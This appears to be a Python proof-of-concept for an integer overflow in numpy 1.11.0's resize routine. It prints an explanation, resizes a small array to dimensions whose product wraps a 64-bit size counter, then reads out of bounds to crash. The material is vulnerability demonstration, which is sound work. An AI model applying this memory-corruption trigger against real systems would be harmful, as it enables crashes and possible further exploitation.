import sys
import numpy as np

if np.version.version != "1.11.0":
    sys.exit("Wrong numpy version! Must be 1.11.0! Exiting...")

print(f"Integer overflow in numpy {np.version.version} in https://github.com/numpy/numpy/blob/v1.11.0/numpy/core/src/multiarray/shape.c")
print("In line 72 we can overflow the 'newsize' variable by resizing an array with very large dimensions.")
print("This results in a new array that is allocated with insufficient size (see line 109).\n")

print("The 'newsize' variable is an unsigned long long integer that can store a 64-bit number.")
print(f"So, the maximum possible value is {hex(18446744073709551615)}. To overflow the variable we can just add 2.\n")

arr = np.ndarray((2, 2), "int8")

print(f"Let's create a random array with a dimension of {arr.shape} that stores 8-bit integers.")
print(f"It's size is 2 * 2 * {arr.itemsize} byte: {arr.nbytes} bytes.\n")

print("Now, let's resize it with very large dimensions to overflow the 'newsize' variable.")
print(f"We choose a dimension of (67280421310721, 274177) which should give us a new size of {hex(67280421310721*274177*arr.itemsize)}.\n")

arr.resize(67280421310721, 274177)
print(f"Resizing is done. New dimension is {arr.shape}. New size is: {arr.nbytes} byte.\n")

print("Finally, let's access the array out-of-bounds and crash...")
arr[0xDEAD][0xBEAF]